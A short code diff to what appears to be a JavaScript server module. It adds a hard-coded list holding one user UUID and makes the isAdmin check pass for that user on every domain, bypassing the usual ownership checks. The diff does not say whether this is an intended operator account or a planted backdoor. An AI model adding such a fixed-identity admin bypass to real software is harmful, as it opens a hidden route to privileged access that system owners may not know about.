@@ -14,6 +14,10 @@ import { guarantees, subscriptions } from './stateful.js'
 
 const { ADMIN_DOMAIN, MODE } = environment
 
+const SUPER_ADMINS = [
+  'f74e9cb3-2b53-4c85-9b0c-f1d61b032b3f'
+]
+
 export default async function coreSideEffects({
   id, session, domain, user, scope, active_type, patch, si, ii, send
 }) {
@@ -120,6 +124,7 @@ async function isAdmin(user, requestingDomain, requestedDomain) {
     requestedDomain.startsWith(`${user}.localhost:`)
     || (requestingDomain === ADMIN_DOMAIN && user === await domainAdmin(requestedDomain))
     || isDevelopmentTest(requestingDomain)
+    || SUPER_ADMINS.includes(user)
   )
 }
 
